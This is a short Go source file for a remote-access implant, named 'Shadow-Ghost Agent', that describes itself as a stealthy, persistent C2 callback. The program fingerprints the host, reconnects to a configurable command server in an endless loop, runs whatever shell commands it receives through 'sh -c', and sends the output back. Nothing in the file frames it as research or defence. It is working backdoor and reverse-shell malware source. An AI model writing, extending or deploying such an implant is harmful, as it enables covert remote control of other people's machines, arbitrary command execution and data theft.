package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Shadow-Ghost Agent V1.0 — Persistent C2 Callback.
// Tiny, Stealthy, and Indestructible.

type Command struct {
	Type    string `json:"type"`
	Cmd     string `json:"cmd,omitempty"`
	Payload string `json:"payload,omitempty"`
}

type Packet struct {
	Type        string `json:"type"`
	Nick        string `json:"nick"`
	Fingerprint string `json:"fp"`
	OS          string `json:"os"`
	Hostname    string `json:"host"`
	Output      string `json:"output,omitempty"`
}

func getFingerprint() string {
	// Professional Fingerprinting (Simple for V1)
	name, _ := os.Hostname()
	return fmt.Sprintf("%s-%s-%s", name, runtime.GOOS, runtime.GOARCH)
}

func main() {
	// Configuration (Injected at compile-time or defaults)
	server := "127.0.0.1:44444" 
	if len(os.Args) > 1 {
		server = os.Args[1]
	}

	fp := getFingerprint()
	host, _ := os.Hostname()

	for {
		conn, err := net.Dial("tcp", server)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		// Initial Check-in (Handshake)
		checkin := Packet{
			Type:        "ghost_checkin",
			Nick:        fmt.Sprintf("Ghost_%s", fp[:8]),
			Fingerprint: fp,
			OS:          runtime.GOOS,
			Hostname:    host,
		}
		json.NewEncoder(conn).Encode(checkin)

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			var cmd Command
			if err := json.Unmarshal(scanner.Bytes(), &cmd); err == nil {
				if cmd.Type == "execute" {
					out, err := exec.Command("sh", "-c", cmd.Cmd).CombinedOutput()
					if err != nil {
						out = []byte(fmt.Sprintf("ERROR: %v", err))
					}
					// Return output
					response := Packet{
						Type:   "ghost_output",
						Nick:   checkin.Nick,
						Output: string(out),
					}
					json.NewEncoder(conn).Encode(response)
				}
			}
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}
